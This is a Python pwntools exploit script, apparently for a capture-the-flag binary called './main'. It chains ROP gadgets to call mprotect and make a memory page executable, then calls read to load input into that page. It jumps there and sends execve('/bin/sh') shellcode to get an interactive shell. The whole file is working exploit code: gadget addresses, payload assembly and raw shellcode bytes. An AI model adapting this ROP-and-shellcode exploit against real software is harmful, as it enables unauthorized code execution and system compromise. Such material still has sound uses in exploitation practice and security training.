#!/usr/bin/env python2

from pwn import *
import sys

GDB_MODE = len(sys.argv) > 1 and sys.argv[1] == '--gdb'

if not GDB_MODE:
    c = process("./main")


# gadgets (use ropper to find them)
eax0 = 0x0000000000462fa0 # mov eax, 0; ret;
syscall = 0x0000000000464609 # syscall; ret;
poprax = 0x000000000040ebef # pop rax; or dh, dh; ret;
poprsi = 0x000000000041694f # pop rsi; adc al, 0xf6; ret;
poprdi = 0x000000000040ffbd # pop rdi; dec dword ptr [rax + 0x21]; ret;
poprdx = 0x0000000000467815 #pop rdx; xor ah, byte ptr [rsi - 9]; ret;

# addresses
buf = 0x00541000 # use vmmap in GDB to find it
dummy = 0x00557000 # heap

# syscall nums
mprotect = 0xa
read = 0x0


# put it together

# padding
payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"

# mark memory page at buf rwx
payload += p64(poprax) # dec dword ptr in poprdi mitigation
payload += p64(dummy)
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # xor ah, byte ptr in poprdx mitigation
payload += p64(dummy)
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprax) # SET RAX = 0
payload += p64(0xa) # SET RAX = 10
payload += p64(syscall) # SYSCALL

# read into buf
payload += p64(poprax) # dec dword ptr in poprdi mitigation
payload += p64(dummy)
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(0x0) # STDIN
payload += p64(poprsi) # xor ah, byte ptr in poprdx mitigation
payload += p64(dummy)
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(eax0) # SET RAX = 0
payload += p64(syscall) # SYSCALL

# jump into buf
payload += p64(buf)

# machine instructions to spawn /bin/sh
# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


# send it

if GDB_MODE:
    print(payload + shellcode)
else:
    c.sendline(payload)
    c.sendline(shellcode)
    c.interactive()

